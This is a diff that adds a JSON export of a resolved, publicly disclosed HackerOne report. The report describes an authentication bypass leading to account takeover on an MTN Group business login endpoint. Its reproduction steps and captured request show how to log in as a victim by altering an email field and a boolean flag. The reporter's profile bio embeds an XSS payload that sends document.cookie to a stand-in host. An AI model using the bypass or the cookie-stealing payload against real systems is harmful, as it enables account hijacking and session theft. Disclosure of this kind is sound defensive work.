@@ -1,0 +1,160 @@
+{
+  "id": 1709881,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNzA5ODgx",
+  "url": "https://hackerone.com/reports/1709881",
+  "title": "Authentication Bypass Leads To  Complete Account TakeveOver on ██████████",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "critical",
+  "readable_substate": "Resolved",
+  "created_at": "2022-09-23T14:15:28.265Z",
+  "submitted_at": "2022-09-23T14:15:28.376Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "reachaxis",
+    "url": "/reachaxis",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/cttm03xioosl96jikp7gwdgvke89/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 41919,
+    "url": "https://hackerone.com/mtn_group",
+    "handle": "mtn_group",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/4e6ikuxrt34g8b14w2bk53c6vyry/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "MTN Group",
+      "twitter_handle": "",
+      "website": "https://www.mtn.com/",
+      "about": ""
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2024-09-14T12:48:03.887Z",
+  "bug_reporter_agreed_on_going_public_at": "2024-08-15T12:47:58.123Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\n\nHello Team,\nWhen an invalid email address/password is entered, the Web Application will not authenticate the user. But nevertheless, it is conceivable for an attacker to get around authentication and log in as anyone else, leading to Complete Account Takeover.\n\n## Steps To Reproduce:\nCreate Two Test Account (Attacker & Victim)\n\nUsing attacker's account, login at ███████ \n\n1. Capture request with Burp. \n2. Without sending request to \"Burp Repeater\",  modify attacker's email to victim's email. For example REDACTED+██████ to  REDACTED+█████. \n3. Change the param `value:false`, to  `value:true,` and click send. \n4. Notice, attacker has successfully bypassed the authentication to login as the victim without any interaction.\n\n## Supporting Material/References:\n███\n\n##Request\n```\nPOST /app/login HTTP/1.1\nHost: mtnmobad.mtnbusiness.com.ng\nCookie: █████\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.27 Safari/537.36\n....snip....\nConnection: close\n{\n\t\"params\":{\n\t\t\"updates\":[\n\t\t{\n\t\t\t\"param\":\"user\",\n\t\t\t\"value\":{\n\t\t\t\t\"userEmail\":\"REDACTED+██████\",\n\t\t\t\t\"userPassword\":\"#######\"\n\t\t\t\t},\n\t\t\t\t\"op\":\"a\"\n\t\t\t\t},\n\t\t\t\t{\n\t\t\t\t\t\"param\":\"gateway\",\n\t\t\t\t\t\"value\":true,\n\t\t\t\t\t\"op\":\"a\"\n\t\t\t\t\t}\n\t\t\t\t\t],\n....more....\n```\n\n##Response\n```\nHTTP/1.1 200 OK\nServer: nginx\n....snip....\n{\n\t\"error\":false,\n\t\"response\":{\n\t\t\"id\":\"/703\",\n\t\"name\":\"Victim ******\",\n\t\"type\":\"Account\",\n\t\"level\":0,\n\t\"notes\":{\n\t\t},\n....more....\n```\n\n██████\n  \n* [attachment / reference]\n1. █████\n2. ██████\n\n## Impact\n\nSupposing there are 100,000 users available, a malicious actor will enumerate all 100,000 emails for all users to achieve a mass account takeover. Additionally, an attacker can lockdown an account, delete an account, change account info, and perform large data leaks.",
+  "weakness": {
+    "id": 142,
+    "name": "Authentication Bypass Using an Alternate Path or Channel"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2024-09-14T12:47:58.363Z",
+  "allow_singular_disclosure_after": -52020915.56848189,
+  "singular_disclosure_allowed": true,
+  "vote_count": 101,
+  "voters": [
+    "luhko",
+    "orange303",
+    "ganeshbagaria",
+    "whybee",
+    "ha4x0r",
+    "sisi0x",
+    "thalaivar304",
+    "c4l33ph4",
+    "izz00",
+    "2026",
+    "and 91 more..."
+  ],
+  "severity": {
+    "rating": "critical",
+    "score": 10.0,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "none",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "high",
+      "integrity": "high",
+      "availability": "high"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 159134,
+    "asset_type": "URL",
+    "asset_identifier": "www.mtn.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "id": 529119,
+      "category": "researcher",
+      "content": "**The application's backend logic placed too much trust on the login information submitted by the user which allowed a remote attacker to bypass authentication and perform account takeover for all users with the wrong password. More details can \nbe found here**\nhttps://medium.com/@reachaxis/how-i-took-over-100-000-user-account-without-knowing-their-password-part-one-7d965ae9e47a",
+      "updated_at": "2024-09-16T14:05:12.802Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 1698557,
+        "username": "reachaxis",
+        "name": "v3rvain0001",
+        "bio": "At least, we have been doing something for a common good. As far as I'm aware, I don't know what can stop us from doing so. '<img src=x onerror=\"fetch(\\'https://example.com/steal?cookie=\\'+document.cookie)\">'",
+        "cleared": false,
+        "verified": false,
+        "website": "https://medium.com/@reachaxis",
+        "location": "",
+        "created_at": "2021-05-04T03:06:25.842Z",
+        "url": "https://hackerone.com/reachaxis",
+        "hackerone_triager": false,
+        "hackerone_employee": false,
+        "user_type": "hacker",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/cttm03xioosl96jikp7gwdgvke89/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/cttm03xioosl96jikp7gwdgvke89/d9695107bfcd68eeb1c9e0912b109cdae9a6c00c0bda6fd4cbd6d9bdb828840a",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/cttm03xioosl96jikp7gwdgvke89/4ac84fbe897190579a137d0cf55152b233cdd4f9984435bd80ef67e5e51a0586"
+        }
+      }
+    }
+  ]
+}
